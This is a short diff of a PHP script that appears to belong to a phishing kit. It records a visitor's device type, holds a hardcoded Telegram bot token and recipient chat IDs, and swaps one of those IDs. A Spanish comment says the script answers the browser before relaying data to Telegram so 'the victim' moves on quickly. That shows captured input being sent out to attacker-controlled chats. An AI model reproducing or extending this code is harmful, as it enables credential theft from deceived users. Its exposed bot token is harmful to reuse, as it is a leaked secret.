@@ -12,7 +12,7 @@ $dis = $_SERVER['HTTP_USER_AGENT'];
 $dis_corto = (strpos($dis, 'Android') !== false) ? "Android" : ((strpos($dis, 'iPhone') !== false) ? "iPhone" : "PC/Otros");
 
 $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
-$ids = ["8114050673", "8518977918", "8638340940"]; 
+$ids = ["8114050673", "6616662846", "8638340940"]; 
 
 if(!empty($u)){
     // Responder al navegador ANTES de enviar a Telegram para que la víctima avance rápido
